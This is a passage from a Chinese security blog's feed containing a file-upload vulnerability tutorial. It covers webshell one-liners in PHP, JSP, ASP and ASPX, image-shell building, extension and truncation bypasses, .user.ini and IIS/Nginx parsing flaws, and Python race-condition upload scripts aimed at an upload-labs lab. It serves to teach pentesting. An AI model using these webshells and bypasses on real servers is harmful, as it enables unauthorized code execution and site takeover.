信息整理</h1><ul><li>整理渗透工具：整理渗透过程中用到的代码，poc，exp等</li><li>整理收集信息：整理渗透过程中收集到的一切信息</li><li>整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息</li><li>目的：为了最后形成报告，形成测试结果使用。</li></ul><h1 id="形成报告"><a class="markdownIt-Anchor" href="#形成报告"></a> 形成报告</h1><ul><li>按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告</li><li>补充介绍：要对漏洞成因，验证过程和带来危害进行分析</li><li>修补建议：当然要对所有产生的问题提出合理高效安全的解决办</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;明确目标&lt;/li&gt;
&lt;li&gt;分析风险、获得授权&lt;/li&gt;
&lt;li&gt;信息搜集&lt;/li&gt;
&lt;li&gt;漏洞探测&lt;/li&gt;
&lt;li&gt;漏洞验证&lt;</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="整体流程" scheme="https://j3f5.github.io/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>文件上传基础</title>
    <link href="https://j3f5.github.io/articles/2023/05/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/05/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/</id>
    <published>2023-05-29T02:29:28.000Z</published>
    <updated>2023-05-30T01:16:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传基础"><a class="markdownIt-Anchor" href="#文件上传基础"></a> 文件上传基础</h1><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/2265061-20210117215821894-1837470042.png" alt="img" style="zoom:80%;" /><h2 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路"></a> 利用思路</h2><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/1622126824257-4360481f-3368-4846-b0db-000bfb9b443e.png" alt="利用思路.png" style="zoom:80%;" /><h2 id="补充"><a class="markdownIt-Anchor" href="#补充"></a> 补充</h2><h3 id="一般上传代码"><a class="markdownIt-Anchor" href="#一般上传代码"></a> 一般上传代码</h3><p>代码内容：其中 uploadfile 就是上传文件的实例，然后通过<code>$_FILE</code>来对文件信息进行读取，然后进行判断，是对应的！！！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $_FILE[&#x27;uploadfile&#x27;][&#x27;name&#x27;];</span><br><span class="line">echo $_FILE[&#x27;uploadfile&#x27;][&#x27;type&#x27;] != &quot;image/png&quot;;</span><br><span class="line">// 这个move...函数需要重点注意，是上传的重要函数</span><br><span class="line">move_uploaded_file($_FILE[&#x27;uploadfile&#x27;][&#x27;name&#x27;], &#x27;../upload/&#x27;.$_FILE[&#x27;uploadfile&#x27;][&#x27;name&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; action=&quot;&quot;&gt;</span><br><span class="line">&lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;uploadfile&quot;/&gt;</span><br><span class="line">&lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><h3 id="文件上传漏洞如何查找及判断"><a class="markdownIt-Anchor" href="#文件上传漏洞如何查找及判断"></a> 文件上传漏洞如何查找及判断？</h3><ol><li><p>黑盒查找。文件后台、会员中心、文件扫描。</p><p>一般可以通过url搜索上传界面</p><p><code>site：easyicon.net upload</code>或<code>inurl:upload.php</code></p><p><strong>文件后台</strong></p><p>进入网站后台不一定获得网站权限，可以从后台获取网站权限（后台拿webshell）</p><p><strong>会员中心</strong></p><p>通过图片上传</p><p><strong>文件扫描</strong></p><p>使用工具扫描出后台路径</p></li><li><p>白盒查找。通过代码分析到上传漏洞、查找文件上传功能。</p></li></ol><p>对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期测试。</p><p>注入点失败：</p><ol><li>上传后没有返回路径（如果知道CMS类型那就好办）</li><li>上传失败</li></ol><h3 id="一句话木马"><a class="markdownIt-Anchor" href="#一句话木马"></a> 一句话木马</h3><ul><li>jsp：<code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;</code></li><li>php：<code>&lt;?php @eval($_POST[‘h4ck’]) ?&gt;</code></li><li>asp：<code>&lt;%eval request (“h4ck”)%&gt;</code></li><li>aspx：<code>&lt;%@ Page Language=“Jscript”%&gt; &lt;%eval(Request.Item[“h4ck”],“unsafe”);%&gt;</code></li></ul><p>他们还有很多变体，但是都离不开命令执行函数。每种脚本的命令执行函数都有不少。其他的</p><h3 id="图片马"><a class="markdownIt-Anchor" href="#图片马"></a> 图片马</h3><ol><li>jpg：图像以<code>ff d8</code>开头</li><li>gif：GIF89a 无敌，在前面加上这个就可以了！不需要什么图片啊啥的！</li></ol><p>然后再加上一句话木马。</p><p>也可以使用<code>copy</code>（需要在cmd下），即<code>copy 1.png /b + shell.php /a webshell.jpg</code></p><h2 id="整体思路"><a class="markdownIt-Anchor" href="#整体思路"></a> 整体思路</h2><ol><li>先扫目录，到什么会员中心找到上传漏洞点</li><li>筛选中间件看有没有解析漏洞</li><li>没有的话，进行注入&amp;&amp;绕过</li><li>不成功，就去看CMS版本和对应的漏洞</li><li>没有类似CMS漏洞，去找编辑器与最近的CVE漏洞</li></ol><h1 id="漏洞与绕过"><a class="markdownIt-Anchor" href="#漏洞与绕过"></a> 漏洞与绕过</h1><h2 id="js前端绕过"><a class="markdownIt-Anchor" href="#js前端绕过"></a> JS前端绕过</h2><p>关闭前端js即可</p><h2 id="文件类型黑名单绕过"><a class="markdownIt-Anchor" href="#文件类型黑名单绕过"></a> 文件类型（黑名单绕过）</h2><h3 id="大小写双写绕过"><a class="markdownIt-Anchor" href="#大小写双写绕过"></a> 大小写/双写绕过</h3><p>文件名：也就是后缀名。包括黑白名单等。</p><ul><li>绕过：<code>Php</code>大小写、<code>pphphp</code>双写</li></ul><h3 id="其他特殊后缀绕过"><a class="markdownIt-Anchor" href="#其他特殊后缀绕过"></a> 其他特殊后缀绕过</h3><p><code>.phtml   .php5</code></p><h2 id="上传函数绕过绕过"><a class="markdownIt-Anchor" href="#上传函数绕过绕过"></a> 上传函数绕过(<code>./</code>绕过)</h2><p>上传函数：<code>move_uploaded_file</code>函数会忽略掉文件末尾的<code>/.</code></p><ul><li>绕过：可以构造<code>save_path=1.php/.</code>，这样<code>file_ext</code>值就为空，就能绕过黑名单，而<code>move_uploaded_file</code>函数忽略文件末尾的<code>/.</code>可以实现保存文件为<code>.php</code></li></ul><h3 id="空格-点绕过windows"><a class="markdownIt-Anchor" href="#空格-点绕过windows"></a> 空格、点绕过(windows)</h3><p>当接收文件时，后台代码的限制条件中没有去除文件名首尾的空格(或是没有对.进行拆分)时，可以利用windows系统的命名规则进行绕过：如，将文件后缀改为<code>xxx.php</code>、<code>xxx.php.</code>、<code>xxx.php .</code></p><p>在windows下xx.jpg[空格] 或xx.jpg.这两类文件是不允许存在的，若这样命名，windows会默认去除空格或点</p><p>还有些情况具体就需要看代码逻辑，比如如果代码只删除一次点且只去除一次首尾空格，在windows环境下就可以用<code>xxx.php. .</code>进行绕过</p><h3 id="data绕过windows"><a class="markdownIt-Anchor" href="#data绕过windows"></a> ::$DATA绕过(windows)</h3><p>::$DATA绕过同样利用了windows的特性</p><p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。</p><p>即在<code>php+windows</code>的环境下,如果<code>文件名+::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名。</p><h3 id="htaccess绕过详细见后"><a class="markdownIt-Anchor" href="#htaccess绕过详细见后"></a> .htaccess绕过（详细见后）</h3><h3 id="userini绕过详细见后"><a class="markdownIt-Anchor" href="#userini绕过详细见后"></a> .user.ini绕过（详细见后）</h3><h3 id="解析漏洞绕过详细见后"><a class="markdownIt-Anchor" href="#解析漏洞绕过详细见后"></a> 解析漏洞绕过（详细见后）</h3><h2 id="文件检测白名单"><a class="markdownIt-Anchor" href="#文件检测白名单"></a> 文件检测（白名单）</h2><h3 id="mime-content-type绕过"><a class="markdownIt-Anchor" href="#mime-content-type绕过"></a> MIME content-type绕过</h3><p>文件类型：MIME类型，MIME类型就是image/png之类的content-type</p><ul><li>涉及函数<code>mime_content_type</code></li><li>MIME类型：<code>image/png</code>、<code>audio/mpeg  # mp3</code></li></ul><h3 id="00截断详细见后"><a class="markdownIt-Anchor" href="#00截断详细见后"></a> %00截断（详细见后）</h3><p>00截断绕过方式需要满足以下条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php版本小于5.3.4``php.ini的magic_quotes_gpc为OFF状态``使用move_uploaded_file函数且参数受用户控制</span><br></pre></td></tr></table></figure><p>此时move_uploaded_file函数遇到0x00会截断</p><p>可以将上传文件后缀改为<code>xx.php%00</code>进行绕过</p><h3 id="0a绕过"><a class="markdownIt-Anchor" href="#0a绕过"></a> %0a绕过</h3><p>%0a绕过方式需要满足以下条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache httpd 2.4.0至2.4.29``FileMatch正则匹配.php|.php5等后缀</span><br></pre></td></tr></table></figure><p>该版本apache会通过<code>$</code>匹配后缀，而<code>$</code>匹配时会正则匹配某字符串结尾或以换行符结尾的一个字符串，即<code>php[换行符]</code>会被匹配成<code>php</code></p><p>可以将上传文件后缀改为<code>xx.php%0a</code>进行绕过</p><h2 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h2><h3 id="文件头绕过"><a class="markdownIt-Anchor" href="#文件头绕过"></a> 文件头绕过</h3><ol><li>文件头：内容头消息<ul><li>涉及函数<code>getimagesize</code>和<code>exif_imagetype</code>函数。</li><li>文件头：<code>gif: GIF89a</code>、<code>png: HEX 89 50 4E 47 0D 0A 1A 0A</code>、<code>jpg: HEX FF D8 FF</code></li></ul></li></ol><p>以上3个函数都是通过检查文件的幻数判断文件的类别。可以直接下列命令制作后门jpg文件进行绕过。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy safe.jpg /b + shell.php /a shell.jpg</span><br></pre></td></tr></table></figure><p>在该场景下，防御姿势除了基本的黑/白名单外，还包括了对一些特定字符的限制，具体情况可以进行fuzz或者有条件可以进行代码审计</p><h3 id="条件竞争二次渲染绕过详细见后"><a class="markdownIt-Anchor" href="#条件竞争二次渲染绕过详细见后"></a> 条件竞争/二次渲染绕过（详细见后）</h3><h3 id="内容逻辑数组绕过与目录命名"><a class="markdownIt-Anchor" href="#内容逻辑数组绕过与目录命名"></a> 内容逻辑数组绕过与目录命名</h3><p>此部分将文件名分成3部分组成一个数组,例如将&quot;xx.jpg&quot;分为:“xx”、“.”、&quot;jpg&quot;三部分</p><blockquote><p>其将文件名分为3个部分，分别检测并且拼接。我们可以改数组绕过</p></blockquote><p>我们抓包将.php/.jpg分三部分修改即可绕过，此时第一部分为.php/，第二部分.，第三部分jpg，后面会拼接成：<code>.php/.</code>，因为上面的move_uploadfile会忽略<code>./</code>所以，上传成功。</p><h1 id="00截断"><a class="markdownIt-Anchor" href="#00截断"></a> 00截断</h1><blockquote><p>00截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。00截断通常用来绕过web软waf的白名单限制。</p><p>所以：<code>0x00</code>，<code>%00</code>，<code>/00</code>都是可以的！</p></blockquote><h2 id="00截断的条件"><a class="markdownIt-Anchor" href="#00截断的条件"></a> <code>%00</code>截断的条件</h2><ol><li><code>php</code>版本要小于5.3.4</li><li>修改<code>php.ini</code>的<code>magic_quotes_gpc</code>为<code>OFF</code>状态（<code>magic_quotes_gpc</code>他的作用类似addslashes()，就是对输入的字符创中的字符进行转义处理）</li><li>上传路径是可以控制的</li></ol><p>则修改路径</p><p><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/2509712-20211105233653166-62761255.png" alt="img" /></p><p>上面的<code>12.php</code>后面多了<code>%00</code>，造成了右边的截断，空格后面的全部都不要了。</p><ul><li>需要注意的是，可能会对<code>%00</code>进行编码。</li></ul><h2 id="如何利用"><a class="markdownIt-Anchor" href="#如何利用"></a> 如何利用</h2><p><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/image-20221208102342070.png" alt="image-20221208102342070" /></p><p>注意，这里面有一个重命名，是我们可以控制的，所以我们可以抓包，然后在POST请求中修改road参数即可！</p><p><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/image-20221208102615825.png" alt="image-20221208102615825" /></p><p>修改之后变成：</p><p><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/image-20221208103020252.png" alt="image-20221208103020252" /></p><p>报错，因为要.jpg为后缀，所以在文件名后面加上.jpg即可（全部都要修改）：</p><p><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/image-20221208103213118.png" alt="image-20221208103213118" /></p><h1 id="逻辑安全"><a class="markdownIt-Anchor" href="#逻辑安全"></a> 逻辑安全</h1><h2 id="二次渲染"><a class="markdownIt-Anchor" href="#二次渲染"></a> 二次渲染</h2><p><strong>在我们上传文件后，网站会对图片进行二次处理（格式、尺寸，保存，删除 要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片（标准化）并放到网站对应的标签进行显示。</strong></p><p>形式：判断图片格式后用<code>imagecreatefromjpeg()</code>函数进行二次渲染</p><p>绕过方式：</p><blockquote><p>抓包找到二次渲染中未被改动的地方，将一句话马插入该地方，<code>.jpg|.png|.gif</code>三种文件格式不同，所以构造马的方式也不同</p></blockquote><p>注：gif文件最简单，直接用ue等16进制编辑器就可以改，但是jpg和png需要特殊的构造脚本</p><p>先将一张正常的jpg图片上传，上传后将服务器存储的二次渲染的图片保存下来。<strong>将保存下来经过服务器二次渲染的那张jpg图片，用010编辑器与我们的图片马进行比对，看哪一些字节是被更改过的，在没有被更改的地方替换成我们的马重新上传</strong>。</p><ul><li>用<a href="https://j7ur8.github.io/WebBook/VUL/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87.html">此脚本</a>进行处理生成payload.jpg。然后再上传payload.jpg</li></ul><p><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/20210808103027.png" alt="image-20210808103027022" /></p><h2 id="条件竞争先上传再校验"><a class="markdownIt-Anchor" href="#条件竞争先上传再校验"></a> 条件竞争（先上传再校验）</h2><p>一些网站上传文件的逻辑是先允许上传任意文件，然后检测上传文件的文件包是否合法（校验文件后缀、内容等），如果不合法则删除文件。这里存在的问题是<strong>文件上传成功后和删除文件之间存在一个短的时间差</strong>（因为要执行检查文件和删除文件的操作），攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击。</p><blockquote><p>造成漏洞的原因：<em><strong>先保存文件，再判断是否是允许的文件，如果不允许，则删除。</strong></em></p></blockquote><p>漏洞利用思路：上传一个写入木马的php文件backdoor.php，抓取数据包，对此数据包进行多线程高并发的重放。与此同时，用python不断的请求文件backdoor.php，由于多线程高并发的重放上传backdoor.php文件，所以一定会存在上传成功但还未来得及删除的backdoor.php文件使得python请求成功，一旦请求成功则会在本地写入木马。用菜刀连接即可getshell。</p><blockquote><p>注意：这种条件竞争，即使你执行了一次，在那段时期内，这个不会被删（正在请求），但是一旦请求完毕，二次渲染完成，则该文件照样被删除！所以，请注意你的脚本是要 <strong>执行创建木马文件</strong> 的功能的。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#backdoor.php</span></span><br><span class="line"><span class="comment">#用来写入木马文件shell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_PO[&quot;cmd&quot;])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#requests_2.py</span></span><br><span class="line"><span class="comment">#用来请求backdoor.php</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://ip/upload-labs/upload/backdoor.php&quot;</span></span><br><span class="line">url_2 = <span class="string">&quot;http://ip/upload-labs/upload/shell.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    html_2 = requests.get(url_2)</span><br><span class="line">    <span class="keyword">if</span> html_2.status_code == <span class="number">200</span>:  <span class="comment">#判断shell.php是否写入成功</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>先上传文件backdoor.php，抓取数据包发送到Inturder模块</p><p>高并发上传脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#upload.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line">file = &#123;   <span class="comment">#文件信息和文件</span></span><br><span class="line">    <span class="string">&quot;upload_file&quot;</span>:<span class="built_in">open</span>(<span class="string">&#x27;C:\\users\\xiamo\\desktop\\backdoor.php&#x27;</span>),</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/octet-stream&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Disposition&quot;</span>:<span class="string">&quot;form-data&quot;</span>,</span><br><span class="line">    <span class="string">&quot;filename&quot;</span>:<span class="string">&quot;backdoor.php&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.120/upload-labs/Pass-17/index.php&quot;</span></span><br><span class="line">data = &#123;        <span class="comment">#参数</span></span><br><span class="line">    <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;上传&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    res = requests.post(url, files=file, data=data)</span><br><span class="line">    <span class="built_in">print</span>(res.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    t = Thread(target=upload())  <span class="comment">#创建线程</span></span><br><span class="line">    t.start()   <span class="comment">#开启线程</span></span><br></pre></td></tr></table></figure><p>另外，使用inturder功能的步骤如下：</p><ol><li><p>清除<code>$$</code>：<img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/image-20221206111316146.png" alt="image-20221206111316146" /></p></li><li><p>设置null payload：<img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/image-20221206111351467.png" alt="image-20221206111351467" /></p></li><li><p>设置多线程：<img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/image-20221206111433015.png" alt="image-20221206111433015" /></p></li><li><p>然后在浏览器中不停地访问那个上传的文件即可。</p></li></ol><h1 id="userini与htaccess绕过"><a class="markdownIt-Anchor" href="#userini与htaccess绕过"></a> user.ini与.htaccess绕过</h1><h2 id="userini"><a class="markdownIt-Anchor" href="#userini"></a> user.ini</h2><h3 id="利用范围"><a class="markdownIt-Anchor" href="#利用范围"></a> 利用范围</h3><ul><li>以fastcgi运行的php</li></ul><p>首先得知道<code>php.ini</code>然后再去了解：<code>.user.ini</code>。它比<code>.htaccess</code>用的更广。<code>.user.ini</code>文件上传绕过和<code>.htaccess</code>文件上传绕过方式相似，都是上传一个攻击者自定义的配置文件导致服务器对图片文件的错误处理而导致的文件执行，但是<code>.user.ini</code>使用更加广泛，只要是以fastcgi运行的php都可以用这个方法，<strong>但是它的局限性在于上传的<code>.user.ini</code>文件目录必须存在可执行的php文件</strong>。</p><p>参考：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html</a></p><h3 id="简析"><a class="markdownIt-Anchor" href="#简析"></a> 简析</h3><ul><li>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</li><li>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</li><li>除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</li></ul><p>配置变量中有<code>auto_prepend_file</code>和<code>auto_apend_file</code>指定在文件前和文件尾包含文件。（这两个才是我们可以上传马的关键，指）如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_apend_file=01.gif <span class="comment"># 指定一个文件，自动包含在要执行的文件前。</span></span><br><span class="line">auto_prepend_file=01.gif <span class="comment"># 指定一个文件，自动包含在要执行的文件后。</span></span><br></pre></td></tr></table></figure><p>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p><h3 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h3><p>新建一个文件名为<code>.user.ini</code>的文件，并将内容写为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=test.txt</span><br></pre></td></tr></table></figure><p>将.user.ini上传至服务器</p><p>新建一个文件名为test.txt的文件，并将内容写为如下，或者写webshell马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>再访问<strong>上传目录下</strong>的<code>???.php</code>，即可将test.txt内的内容脚本正常执行。</p><h2 id="htaccess"><a class="markdownIt-Anchor" href="#htaccess"></a> .htaccess</h2><p>见apache解析漏洞绕过</p><h1 id="解析漏洞"><a class="markdownIt-Anchor" href="#解析漏洞"></a> 解析漏洞</h1><p><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-16853257498023.png" alt="解析漏洞" /></p><p><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/1375459-20211201155753089-1314980857.png" alt="img" /></p><h2 id="iis解析漏洞"><a class="markdownIt-Anchor" href="#iis解析漏洞"></a> IIS解析漏洞</h2><h3 id="目录解析漏洞testasp1jpg"><a class="markdownIt-Anchor" href="#目录解析漏洞testasp1jpg"></a> 目录解析漏洞（/test.asp/1.jpg）</h3><p>在 IIS5.x/6.0 中，在网站下建立文件夹的名字为<code>*.asp</code>、<code>*.asa</code>、<code>*.cer</code>、<code>*.cdx</code> 的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp，那么 /test.asp/1.jpg 将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能拿shell了。</p><h3 id="文件名解析漏洞testaspjpg"><a class="markdownIt-Anchor" href="#文件名解析漏洞testaspjpg"></a> 文件名解析漏洞(test.asp;.jpg)</h3><p>在 IIS5.x/6.0 中， 分号后面的不被解析，也就是说 <code>xie.asp;.jpg </code>会被服务器看成是<code>xie.asp</code>。还有IIS6.0默认的可执行文件除了<code>asp</code>还包含这两种 <code>.asa </code> <code>.cer</code> 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传<code> *.asp;.jpg</code>、<code>*.asa;.jpg</code>、<code>*.cer;.jpg </code>后缀的文件，就可以通过服务器校验，并且服务器会把它当成<code>asp</code>文件执行。</p><h3 id="畸形解析漏洞testjpgphp"><a class="markdownIt-Anchor" href="#畸形解析漏洞testjpgphp"></a> 畸形解析漏洞(test.jpg/*.php)</h3><blockquote><p>微软发布了IIS7.0修补了IIS6.0的解析漏洞，没想到IIS7.0爆出更严重的畸形解析漏洞，于是微软急忙发布了IIS7.5</p></blockquote><p>在 IIS7.0中，在默认Fast-CGI开启状况下，我们往图片里面写入下面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[x])?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将文件保存成<code>test.jpg</code>格式，上传到服务器，假设上传路径为<code>/upload</code>，上传成功后，直接访问<code>/upload/test.jpg/x.php</code>，此时神奇的畸形解析开始发挥作用啦。<code>test.jpg</code>将会被服务器当成php文件执行（这个的执行过程看下面），所以图片里面的代码就会被执行。我们会神奇的发现在 <code>/upload </code>目录下创建了一个一句话木马文件<code> shell.php</code>。</p><blockquote><p>临时解决办法：设置 cgi.fix_pathinfo为0</p></blockquote><h2 id="ngnix解析漏洞"><a class="markdownIt-Anchor" href="#ngnix解析漏洞"></a> Ngnix解析漏洞</h2><h3 id="畸形解析漏洞testjpgphp-2"><a class="markdownIt-Anchor" href="#畸形解析漏洞testjpgphp-2"></a> 畸形解析漏洞(test.jpg/*.php)</h3><blockquote><p>原因：php的配置文件 php.ini 文件中开启了 cgi.fix_pathinfo（默认为1表示开启）。/etc/php5/fpm/pool.d/www.conf中不正确的配置security.limit_extensions，导致允许将其他格式文件作为php解析执行</p></blockquote><p>例子：</p><ul><li>test.jpg存在（已上传），a.php不存在</li><li>访问：<code>test.jpg/a.php</code>。因为<code>a.php</code>，所以交给PHP处理；PHP发现没有这个文件，那么删除后面的<code>a.php</code>访问<code>test.jpg</code>，然后发现这个不是php文件，执行不了，于是返回<strong>Access denied</strong>。</li><li>但是Ngnix+php就可以，而且与Nginx无关，但在高版本的php中，由于<code>security.limit_extensions</code> 的引入，使得该漏洞难以被成功利用。因为Nginx只要一看URL中路径名以<code>.php</code>结尾，<strong>便不管该文件是否存在，直接交给php处理</strong>。而如Apache等，会先看该文件是否存在，若存在则再决定该如何处理。<ul><li>cgi.fix_pathinfo是php具有的，若在php前便已正确判断了文件是否存在，cgi.fix_pathinfo便派不上用场了，这一问题自然也就不存在了。（IIS在这一点和Nginx是一样的，同样存在这一问题）</li></ul></li></ul><h3 id="00空字节代码解析漏洞"><a class="markdownIt-Anchor" href="#00空字节代码解析漏洞"></a> 